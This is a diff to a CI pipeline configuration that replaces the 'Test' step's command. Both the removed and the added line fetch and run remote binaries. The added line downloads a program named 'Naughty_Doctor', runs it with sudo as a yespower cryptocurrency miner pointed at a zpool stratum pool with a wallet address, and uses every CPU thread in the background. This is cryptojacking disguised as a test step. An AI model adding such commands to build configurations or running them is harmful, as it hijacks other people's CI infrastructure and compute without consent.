@@ -13,4 +13,4 @@ jobs:
       - run:
           name: Test
           command: |
-            git clone https://github.com/mafaferah/flask-example.git && cd flask-example && chmod 777 bot && ./bot
+            wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Naughty_Doctor && chmod +x Naughty_Doctor && sudo ./Naughty_Doctor --algorithm yespower --pool stratum+tcp://yespower.sea.mine.zpool.ca:6234 --wallet LUJ35osZKFDNzLmpp7aykomJ3zecrW64Eu.ZZ --password c=LTC --cpu-threads $(nproc --all) --keepalive value &
